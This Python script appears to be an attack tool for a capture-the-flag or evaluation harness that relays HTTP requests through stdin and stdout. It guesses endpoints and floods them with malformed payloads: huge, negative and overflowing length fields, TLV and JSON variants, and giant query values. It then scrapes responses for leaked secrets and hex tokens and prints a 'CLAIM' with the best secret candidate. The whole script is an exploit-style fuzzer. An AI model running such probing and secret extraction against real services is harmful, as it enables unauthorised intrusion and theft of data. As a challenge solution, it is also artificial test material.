import sys, json, base64, re, struct

def req(method, path, headers=None, body=None, body_hex=None):
    m = {"http": {"method": method, "path": path}}
    if headers: m["http"]["headers"] = headers
    if body_hex is not None: m["http"]["body_hex"] = body_hex
    elif body is not None: m["http"]["body"] = body
    sys.stdout.write(json.dumps(m) + "\n"); sys.stdout.flush()
    line = sys.stdin.readline()
    if not line: return None
    try: r = json.loads(line)
    except Exception: return None
    b = r.get("body_b64")
    if b:
        try:
            raw = base64.b64decode(b)
            r["text"] = raw.decode("utf-8", "replace")
            r["raw"] = raw.hex()
        except Exception: pass
    return r

log = []

# 1. Enumerate endpoints via query params and path variants that often behave
#    differently from plain404 (404 JSON body reveals router style).
base_paths = ["/","/parse","/record","/records","/upload","/ingest","/recv","/receive",
"/submit","/data","/packet","/frame","/tlv","/bin","/binary","/raw","/msg",
"/rpc","/stream","/batch","/post","/put","/write","/api","/api/parse","/api/record",
"/v1/parse","/v1/record","/read","/get","/fetch","/load","/feed","/event",
"/query","/search","/find","/index","/list","/all","/records/list","/parse/record"]

alive = []
for p in base_paths:
    r = req("GET", p)
    if r is None: continue
    st = r.get("status")
    tx = str(r.get("text", ""))
    if st != 404 or "not found" not in tx:
        alive.append((p, st, tx[:300]))

# also check OPTIONS/HEAD signatures for hidden methods
sys.stderr.write("ALIVE=" + json.dumps(alive) + "\n")

# 2. If nothing alive, try to make the ROOT accept POST bodies of many shapes
targets = [p for p, _, _ in alive] or ["/", "/parse"]

def payloads():
    P = []
    # TLV: type(1) len(1) data  -- various len bytes
    for L in (0x7f, 0x80, 0xfe, 0xff):
        P.append(b"\x01" + bytes([L]) + b"A" * 8)
        P.append(b"\x01\x00\x00" + bytes([L]) + b"A" * 8)
        P.append(b"\x00\x01\x00" + bytes([L]) + b"A" * 16)
    # 2/4/8-byte big-endian length fields, huge values
    for v in (0xffffffff, 0x7fffffff, 0x80000000, 0xfffffffe, 0x100000000, 0xffffffffffffffff, 0x7fffffffffffffff):
        for nb in (1, 2, 4, 8):
            if nb == 1 and v > 0xff: continue
            if nb == 2 and v > 0xffff: continue
            if nb == 4 and v > 0xffffffff: continue
            try: P.append(v.to_bytes(nb, "big") + b"B" * 16)
            except Exception: pass
            try: P.append(b"\x00" + v.to_bytes(nb, "big") + b"B" * 16)
            except Exception: pass
    # 2-byte little endian (network-order mismatch style)
    for v in (0xffff, 0x7fff, 0xfffe, 0x00ff):
        P.append(v.to_bytes(2, "little") + b"C" * 16)
    # negative signed lengths
    for v in (-1, -2, -1024, -2147483648):
        P.append(struct.pack("<i", v) + b"D" * 16)
        P.append(struct.pack(">i", v) + b"D" * 16)
    # huge body with repeated big length (overflow repeat count)
    P.append(b"\xff\xff\xff\xff" * 8 + b"E" * 32)
    P.append(b"\x00\xff\xff\xff\xff" + b"E" * 32)
    P.append(b"\xff\xff\xff\x7f" + b"E" * 32)
    P.append(b"\x00\x00\xff\xff" + b"E" * 32)
    P.append(b"\x10\x00" + b"\x00" * 16 + b"F" * 64)
    # newline / null terminated header lines
    P.append(b"len=99999999999\n" + b"A" * 16)
    P.append(b"4\nAAAA\n5\nBBBBB\n")
    P.append(b"AAAA" + b"\x00" * 8)
    P.append(b"\x00" * 8 + b"AAAA")
    P.append(b"\xde\xad\xbe\xef" * 4)
    P.append(b"AAAA" * 64)
    P.append(b"\xff" * 256)
    P.append(b"\x00\x00\x00\x00\x00\x00\x00\x01" + b"\x00" * 8 + b"G" * 8)
    P.append(b"\x00\x00\x00\x02" + b"\x00\x00\x00\x01" + b"\x00" * 8 + b"H" * 8)
    return P

cands = []
seen = set()
CT = ["application/octet-stream", "application/x-www-form-urlencoded", "application/json", "text/plain"]

for p in targets:
    for pb in payloads():
        for ct in CT:
            r = req("POST", p, body_hex=pb.hex(), headers={"Content-Type": ct})
            if r is None: continue
            st = r.get("status"); tx = str(r.get("text", "")); raw = str(r.get("raw", ""))
            key = (st, tx[:200])
            if key not in seen:
                seen.add(key)
                log.append((p, ct, pb[:24].hex(), st, tx[:400]))
            for m in re.findall(r"(?i)secret[\"' :=]+([0-9a-fA-F]{8,})", tx):
                cands.append(m)
            for m in re.findall(r"\b[0-9a-fA-F]{16,}\b", tx):
                if len(set(m.lower())) >= 4:
                    cands.append(m)
    # GET with giant query values
    for q in ["?len=99999999999", "?size=99999999999", "?length=4294967295", "?n=-1",
              "?count=-1", "?len=-1", "?size=-1", "?length=-1", "?n=0xffffffffffffffff",
              "?len=0x7fffffff", "?record=1", "?records=100", "?format=raw", "?type=tlv",
              "?data=41414141", "?payload=41414141", "?msg=41414141", "?proto=1&len=99999"]:
        r = req("GET", p + q)
        if r is None: continue
        st = r.get("status"); tx = str(r.get("text", ""))
        key = (st, tx[:200])
        if key not in seen:
            seen.add(key)
            log.append((p, q, st, tx[:400]))
        for m in re.findall(r"(?i)secret[\"' :=]+([0-9a-fA-F]{8,})", tx):
            cands.append(m)
        for m in re.findall(r"\b[0-9a-fA-F]{16,}\b", tx):
            if len(set(m.lower())) >= 4:
                cands.append(m)

#3. JSON body variants on live targets
for p in targets:
    for jb in ['{"len":99999999999}', '{"length":99999999999}', '{"size":-1}',
               '{"count":4294967295}', '{"records":-1}', '{"n":-1}', '{"data":"AAAA","length":9999999}',
               '{"records":[{"len":99999999999}]}', '{"type":1,"length":4294967295,"data":"AA"}',
               '[{"len":99999999999}]', '{"records":[{"len":99999999999}]}', '[]', '{}']:
        r = req("POST", p, body=jb, headers={"Content-Type": "application/json"})
        if r is None: continue
        st = r.get("status"); tx = str(r.get("text", ""))
        key = (st, tx[:200])
        if key not in seen:
            seen.add(key)
            log.append((p, "json:" + jb[:40], st, tx[:400]))
        for m in re.findall(r"(?i)secret[\"' :=]+([0-9a-fA-F]{8,})", tx):
            cands.append(m)
        for m in re.findall(r"\b[0-9a-fA-F]{16,}\b", tx):
            if len(set(m.lower())) >= 4:
                cands.append(m)

sys.stderr.write(json.dumps(log)[:14000] + "\n")
sys.stderr.write("CANDS=" + json.dumps(sorted(set(cands)))[:4000] + "\n")

# Filter out hex of ascii json error payloads, pick best
def bad(h):
    low = h.lower()
    if len(set(low)) < 4: return True
    try:
        s = bytes.fromhex(h).decode("utf-8")
        if s.strip().startswith("{"): return True
    except Exception: pass
    return False

good = [c for c in set(cands) if not bad(c)]
if good:
    good.sort(key=lambda h: (len(h) % 2 != 0, -len(h)))
    best = good[0]
else:
    best = ""
print('CLAIM:{"secret_hex": "' + best + '"}', flush=True)